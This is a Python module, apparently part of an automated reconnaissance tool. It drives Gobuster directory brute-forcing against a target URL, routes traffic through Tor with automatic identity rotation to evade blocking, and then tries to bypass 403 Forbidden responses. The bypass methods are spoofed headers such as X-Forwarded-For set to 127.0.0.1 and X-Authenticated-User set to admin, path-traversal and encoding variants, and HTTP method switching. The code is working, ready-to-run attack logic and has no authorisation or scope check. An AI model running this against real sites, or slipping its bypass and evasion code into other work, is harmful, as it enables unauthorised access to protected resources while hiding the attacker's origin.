# task_gobuster.py
"""
Advanced directory and file brute-forcing with Gobuster.
Includes Tor integration, 403 bypass techniques, and intelligent filtering.
"""

import subprocess
import requests
import time
import re
import threading
from typing import List, Dict, Optional, Set
from urllib.parse import urljoin, urlparse
from ai_core import get_with_retry
from config import (
    TOR_ENABLED, TOR_PROXY, TOR_CONTROL_PORT, TOR_CONTROL_PASSWORD,
    TOR_ROTATION_INTERVAL, GOBUSTER_THREADS, GOBUSTER_TIMEOUT,
    GOBUSTER_DELAY, GOBUSTER_WORDLIST, WINDOWS_RESERVED_NAMES,
    BYPASS_METHODS, GENERIC_ERROR_SIGNATURES, REQUEST_USER_AGENT
)


class TorProxyManager:
    """Manages Tor proxy connections with rotation and error handling."""
    
    def __init__(self):
        self.enabled = TOR_ENABLED
        self.proxy_url = TOR_PROXY
        self.control_port = TOR_CONTROL_PORT
        self.control_password = TOR_CONTROL_PASSWORD
        self.rotation_interval = TOR_ROTATION_INTERVAL
        self.last_rotation = time.time()
        self.consecutive_failures = 0
        self.max_failures = 3
        self.lock = threading.Lock()
        
    def get_proxy_dict(self) -> Optional[Dict[str, str]]:
        """Get proxy configuration dictionary."""
        if not self.enabled:
            return None
            
        return {
            'http': self.proxy_url,
            'https': self.proxy_url
        }
        
    def test_connection(self) -> bool:
        """Test if Tor connection is working."""
        if not self.enabled:
            return True
            
        try:
            response = requests.get(
                'https://check.torproject.org/api/ip',
                proxies=self.get_proxy_dict(),
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                is_tor = data.get('IsTor', False)
                
                if is_tor:
                    print("[TOR] ✅ Connection verified")
                    self.consecutive_failures = 0
                    return True
                else:
                    print("[TOR] ⚠️ Not using Tor network")
                    return False
            else:
                print(f"[TOR] ❌ Connection test failed: {response.status_code}")
                return False
                
        except requests.exceptions.ConnectionError:
            print("[TOR] ❌ Connection error - is Tor running?")
            self.consecutive_failures += 1
            return False
        except requests.exceptions.Timeout:
            print("[TOR] ❌ Connection timeout")
            self.consecutive_failures += 1
            return False
        except Exception as e:
            print(f"[TOR] ❌ Error: {str(e)}")
            self.consecutive_failures += 1
            return False
            
    def rotate_identity(self) -> bool:
        """Request new Tor identity (circuit)."""
        if not self.enabled:
            return True
            
        with self.lock:
            try:
                import socket
                
                # Connect to Tor control port
                s = socket.socket()
                s.connect(('127.0.0.1', self.control_port))
                
                # Authenticate
                if self.control_password:
                    s.send(f'AUTHENTICATE "{self.control_password}"\r\n'.encode())
                else:
                    s.send(b'AUTHENTICATE\r\n')
                    
                response = s.recv(1024).decode()
                
                if "250 OK" not in response:
                    print(f"[TOR] ❌ Authentication failed")
                    s.close()
                    return False
                    
                # Send NEWNYM signal
                s.send(b'SIGNAL NEWNYM\r\n')
                response = s.recv(1024).decode()
                s.close()
                
                if "250 OK" in response:
                    print("[TOR] ✅ Identity rotated")
                    self.last_rotation = time.time()
                    self.consecutive_failures = 0
                    time.sleep(2)  # Wait for new circuit
                    return True
                else:
                    print(f"[TOR] ❌ Rotation failed")
                    return False
                    
            except Exception as e:
                print(f"[TOR] ❌ Rotation error: {str(e)}")
                return False
                
    def should_rotate(self) -> bool:
        """Check if it's time to rotate identity."""
        if not self.enabled:
            return False
            
        elapsed = time.time() - self.last_rotation
        return elapsed >= self.rotation_interval
        
    def handle_failure(self):
        """Handle connection failure."""
        self.consecutive_failures += 1
        
        if self.consecutive_failures >= self.max_failures:
            print(f"[TOR] ⚠️ Too many failures ({self.consecutive_failures}), rotating identity")
            self.rotate_identity()


class BypassTechniques:
    """403 Forbidden bypass techniques."""
    
    @staticmethod
    def get_bypass_headers() -> List[Dict[str, str]]:
        """Get list of header variations for bypass attempts."""
        return [
            # Original URL headers
            {'X-Original-URL': ''},
            {'X-Rewrite-URL': ''},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-Host': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': '127.0.0.1'},
            {'X-ProxyUser-IP': '127.0.0.1'},
            # Override host
            {'X-Originating-IP': '127.0.0.1'},
            {'True-Client-IP': '127.0.0.1'},
            {'Cluster-Client-IP': '127.0.0.1'},
            # Authentication bypass
            {'X-Authenticated-User': 'admin'},
            {'X-User': 'admin'},
        ]
        
    @staticmethod
    def get_path_variations(path: str) -> List[str]:
        """Get path manipulation variations."""
        variations = [path]
        
        # Case variations
        variations.append(path.upper())
        variations.append(path.lower())
        
        # Path traversal
        variations.append(f"/{path}")
        variations.append(f"./{path}")
        variations.append(f"../{path}")
        variations.append(f"/{path}/.")
        variations.append(f"/{path}/..")
        variations.append(f"//{path}")
        variations.append(f"/{path}//")
        
        # Encoding variations
        variations.append(f"/%2e{path}")
        variations.append(f"{path}%20")
        variations.append(f"{path}%09")
        variations.append(f"{path}?")
        variations.append(f"{path}#")
        variations.append(f"{path}/~")
        
        return list(set(variations))
        
    @staticmethod
    def get_http_methods() -> List[str]:
        """Get HTTP methods for bypass attempts."""
        return ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE']
        
    @staticmethod
    def try_bypass(url: str, proxies: Optional[Dict] = None) -> Optional[Dict[str, any]]:
        """
        Try multiple bypass techniques on a URL.
        
        Args:
            url: Target URL
            proxies: Proxy configuration
            
        Returns:
            Dict with successful bypass info or None
        """
        parsed = urlparse(url)
        path = parsed.path
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        
        print(f"[BYPASS] Attempting bypass on {url}")
        
        # Try header bypass
        if 'headers' in BYPASS_METHODS:
            for headers in BypassTechniques.get_bypass_headers():
                headers['User-Agent'] = REQUEST_USER_AGENT
                # Set path in header
                for header_key in ['X-Original-URL', 'X-Rewrite-URL']:
                    if header_key in headers:
                        headers[header_key] = path
                        
                response = get_with_retry(base_url, headers=headers, proxies=proxies, timeout=5, max_retries=1)
                
                if response and response.status_code == 200:
                    print(f"[BYPASS] ✅ Success with header: {list(headers.keys())[0]}")
                    return {
                        'method': 'header',
                        'technique': list(headers.keys())[0],
                        'status': 200,
                        'url': url
                    }
                    
        # Try path manipulation
        if 'path' in BYPASS_METHODS:
            for path_variation in BypassTechniques.get_path_variations(path):
                test_url = urljoin(base_url, path_variation)
                response = get_with_retry(test_url, proxies=proxies, timeout=5, max_retries=1)
                
                if response and response.status_code == 200:
                    print(f"[BYPASS] ✅ Success with path: {path_variation}")
                    return {
                        'method': 'path',
                        'technique': path_variation,
                        'status': 200,
                        'url': test_url
                    }
                    
        # Try HTTP method changes
        if 'method' in BYPASS_METHODS:
            for method in BypassTechniques.get_http_methods():
                if method == 'GET':
                    continue
                    
                try:
                    response = requests.request(
                        method,
                        url,
                        proxies=proxies,
                        timeout=5,
                        headers={'User-Agent': REQUEST_USER_AGENT},
                        allow_redirects=True
                    )
                    
                    if response.status_code == 200:
                        print(f"[BYPASS] ✅ Success with method: {method}")
                        return {
                            'method': 'http_method',
                            'technique': method,
                            'status': 200,
                            'url': url
                        }
                except:
                    continue
                    
        print("[BYPASS] ❌ All bypass attempts failed")
        return None


def is_windows_reserved_name(path: str) -> bool:
    """
    Check if path contains Windows reserved names.
    
    Args:
        path: Path to check
        
    Returns:
        True if contains reserved name
    """
    path_upper = path.upper()
    path_parts = path_upper.split('/')
    
    for part in path_parts:
        # Remove extension
        name = part.split('.')[0]
        
        if name in WINDOWS_RESERVED_NAMES:
            return True
            
    return False


def is_generic_error_page(content: str, status_code: int) -> bool:
    """
    Check if response is a generic error page.
    
    Args:
        content: Response content
        status_code: HTTP status code
        
    Returns:
        True if generic error page
    """
    if status_code >= 400:
        content_lower = content.lower()
        
        # Check for error signatures
        for signature in GENERIC_ERROR_SIGNATURES:
            if signature in content_lower:
                return True
                
    return False


def is_external_url(url: str, base_domain: str) -> bool:
    """
    Check if URL points to external domain.
    
    Args:
        url: URL to check
        base_domain: Base domain to compare against
        
    Returns:
        True if external
    """
    parsed = urlparse(url)
    
    if not parsed.netloc:
        return False
        
    # Extract domain
    url_domain = parsed.netloc.lower()
    base_domain = base_domain.lower()
    
    # Remove port if present
    url_domain = url_domain.split(':')[0]
    base_domain = base_domain.split(':')[0]
    
    return url_domain != base_domain and not url_domain.endswith(f".{base_domain}")


def collect_baseline_signatures(url: str, proxies: Optional[Dict] = None) -> Dict[str, any]:
    """
    Collect baseline signatures from the target for false positive filtering.
    
    Args:
        url: Base URL
        proxies: Proxy configuration
        
    Returns:
        Dict with baseline signatures
    """
    print(f"[BASELINE] Collecting signatures from {url}")
    
    signatures = {
        '404_length': 0,
        '404_content': '',
        '403_length': 0,
        '403_content': '',
        'redirect_patterns': []
    }
    
    # Test 404 response
    test_404_url = urljoin(url, f'/nonexistent-{time.time()}.html')
    response = get_with_retry(test_404_url, proxies=proxies, timeout=10)
    
    if response:
        signatures['404_length'] = len(response.content)
        signatures['404_content'] = response.text[:1000]
        
        # Check for redirects
        if len(response.history) > 0:
            for resp in response.history:
                if 'Location' in resp.headers:
                    signatures['redirect_patterns'].append(resp.headers['Location'])
                    
    # Test 403 response (if possible)
    test_403_url = urljoin(url, '/admin')
    response = get_with_retry(test_403_url, proxies=proxies, timeout=10)
    
    if response and response.status_code == 403:
        signatures['403_length'] = len(response.content)
        signatures['403_content'] = response.text[:1000]
        
    print(f"[BASELINE] ✅ Collected: 404_len={signatures['404_length']}, 403_len={signatures['403_length']}")
    
    return signatures


def follow_redirects_and_validate(url: str, proxies: Optional[Dict] = None, 
                                  max_redirects: int = 5) -> Optional[Dict[str, any]]:
    """
    Follow redirects and validate final response.
    
    Args:
        url: URL to check
        proxies: Proxy configuration
        max_redirects: Maximum redirects to follow
        
    Returns:
        Dict with final URL and response info
    """
    try:
        response = requests.get(
            url,
            proxies=proxies,
            timeout=10,
            headers={'User-Agent': REQUEST_USER_AGENT},
            allow_redirects=True,
            max_redirects=max_redirects
        )
        
        final_url = response.url
        
        return {
            'original_url': url,
            'final_url': final_url,
            'status_code': response.status_code,
            'content_length': len(response.content),
            'redirected': url != final_url,
            'redirect_count': len(response.history)
        }
        
    except requests.exceptions.TooManyRedirects:
        print(f"[REDIRECT] Too many redirects for {url}")
        return None
    except Exception as e:
        print(f"[REDIRECT] Error: {str(e)}")
        return None


def filter_results(results: List[str], base_url: str, baseline: Dict[str, any]) -> List[Dict[str, any]]:
    """
    Filter Gobuster results to remove false positives.
    
    Args:
        results: Raw Gobuster results
        base_url: Base URL
        baseline: Baseline signatures
        
    Returns:
        Filtered results with metadata
    """
    filtered = []
    base_domain = urlparse(base_url).netloc
    
    for line in results:
        # Parse Gobuster output
        match = re.search(r'(/.+?)\s+\(Status: (\d+)\)\s+\[Size: (\d+)\]', line)
        
        if not match:
            continue
            
        path, status, size = match.groups()
        status = int(status)
        size = int(size)
        
        full_url = urljoin(base_url, path)
        
        # Filter Windows reserved names
        if is_windows_reserved_name(path):
            print(f"[FILTER] Skipping Windows reserved name: {path}")
            continue
            
        # Filter external URLs
        if is_external_url(full_url, base_domain):
            print(f"[FILTER] Skipping external URL: {full_url}")
            continue
            
        # Filter by size similarity to baseline
        if status == 404 and baseline['404_length'] > 0:
            if abs(size - baseline['404_length']) < 50:
                print(f"[FILTER] Skipping similar to 404 baseline: {path}")
                continue
                
        if status == 403 and baseline['403_length'] > 0:
            if abs(size - baseline['403_length']) < 50:
                print(f"[FILTER] Skipping similar to 403 baseline: {path}")
                continue
                
        # Add to results
        filtered.append({
            'path': path,
            'url': full_url,
            'status': status,
            'size': size
        })
        
    return filtered


def run_gobuster_scan(url: str, wordlist: str = None, tor_manager: TorProxyManager = None) -> List[Dict[str, any]]:
    """
    Run Gobuster directory scan with enhanced features.
    
    Args:
        url: Target URL
        wordlist: Path to wordlist (uses default if None)
        tor_manager: Tor proxy manager instance
        
    Returns:
        List of discovered paths with metadata
    """
    if wordlist is None:
        wordlist = GOBUSTER_WORDLIST
        
    print(f"\n{'='*80}")
    print(f"🔍 GOBUSTER DIRECTORY SCAN")
    print(f"Target: {url}")
    print(f"Wordlist: {wordlist}")
    print(f"Tor: {'Enabled' if tor_manager and tor_manager.enabled else 'Disabled'}")
    print(f"{'='*80}\n")
    
    # Initialize Tor if enabled
    if tor_manager and tor_manager.enabled:
        if not tor_manager.test_connection():
            print("[ERROR] Tor connection failed, disabling Tor")
            tor_manager.enabled = False
            
    # Collect baseline signatures
    proxies = tor_manager.get_proxy_dict() if tor_manager else None
    baseline = collect_baseline_signatures(url, proxies)
    
    # Build Gobuster command
    command = [
        'gobuster', 'dir',
        '-u', url,
        '-w', wordlist,
        '-t', str(GOBUSTER_THREADS),
        '--timeout', f"{GOBUSTER_TIMEOUT}s",
        '--delay', GOBUSTER_DELAY,
        '-q',  # Quiet mode
        '--no-error'
    ]
    
    # Add proxy if using Tor
    if proxies and tor_manager.enabled:
        command.extend(['--proxy', proxies['http']])
        
    print(f"[GOBUSTER] Running scan...")
    
    try:
        result = subprocess.run(
            command,
            capture_output=True,
            text=True,
            timeout=600  # 10 minute timeout
        )
        
        if result.returncode != 0 and result.stderr:
            print(f"[GOBUSTER] Warning: {result.stderr[:200]}")
            
        raw_results = result.stdout.splitlines()
        
        # Filter results
        filtered = filter_results(raw_results, url, baseline)
        
        print(f"\n[GOBUSTER] ✅ Found {len(filtered)} paths")
        
        # Try bypass on 403s
        for item in filtered:
            if item['status'] == 403:
                print(f"\n[403] Detected: {item['url']}")
                bypass_result = BypassTechniques.try_bypass(item['url'], proxies)
                
                if bypass_result:
                    item['bypass'] = bypass_result
                    item['status'] = 200  # Update status
                    print(f"[403] ✅ Bypassed successfully")
                    
        return filtered
        
    except subprocess.TimeoutExpired:
        print("[GOBUSTER] ❌ Scan timed out")
        return []
    except FileNotFoundError:
        print("[GOBUSTER] ❌ Gobuster not installed")
        return []
    except Exception as e:
        print(f"[GOBUSTER] ❌ Error: {str(e)}")
        return []


def execute_gobuster_scan(target: str, wordlist: str = None) -> Dict[str, any]:
    """
    Main entry point for Gobuster scanning.
    
    Args:
        target: Target URL
        wordlist: Optional wordlist path
        
    Returns:
        Scan results dictionary
    """
    # Initialize Tor manager
    tor_manager = TorProxyManager()
    
    # Run scan
    results = run_gobuster_scan(target, wordlist, tor_manager)
    
    # Organize results
    output = {
        'target': target,
        'total_found': len(results),
        'accessible': [r for r in results if r['status'] == 200],
        'forbidden': [r for r in results if r['status'] == 403 and 'bypass' not in r],
        'bypassed': [r for r in results if 'bypass' in r],
        'other': [r for r in results if r['status'] not in [200, 403]]
    }
    
    print(f"\n{'='*80}")
    print(f"✅ SCAN COMPLETE")
    print(f"Total: {output['total_found']}")
    print(f"Accessible: {len(output['accessible'])}")
    print(f"Forbidden: {len(output['forbidden'])}")
    print(f"Bypassed: {len(output['bypassed'])}")
    print(f"Other: {len(output['other'])}")
    print(f"{'='*80}\n")
    
    return output
